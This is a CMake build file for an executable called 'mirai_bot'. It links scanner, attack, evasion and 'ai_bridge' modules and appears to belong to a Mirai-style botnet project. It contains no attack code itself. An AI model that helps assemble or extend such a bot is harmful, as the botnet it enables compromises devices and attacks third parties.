# Bot component CMakeLists.txt
# Uses modern modular architecture: scanner, attack, ai_bridge, evasion

add_executable(mirai_bot
    main.c
)

target_include_directories(mirai_bot PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}
    ${CMAKE_SOURCE_DIR}/src/common
    ${CMAKE_SOURCE_DIR}/src/scanner
    ${CMAKE_SOURCE_DIR}/src/attack
    ${CMAKE_SOURCE_DIR}/src/ai_bridge
    ${CMAKE_SOURCE_DIR}/src/evasion
    ${JSON_C_INCLUDE_DIRS}
    ${SODIUM_INCLUDE_DIRS}
)

target_link_libraries(mirai_bot
    mirai_scanner
    mirai_attack
    mirai_ai_bridge
    mirai_evasion
    mirai_common
    pthread
    curl
    ${JSON_C_LIBRARIES}
    ${SODIUM_LIBRARIES}
)

# Install
install(TARGETS mirai_bot
    RUNTIME DESTINATION bin
)
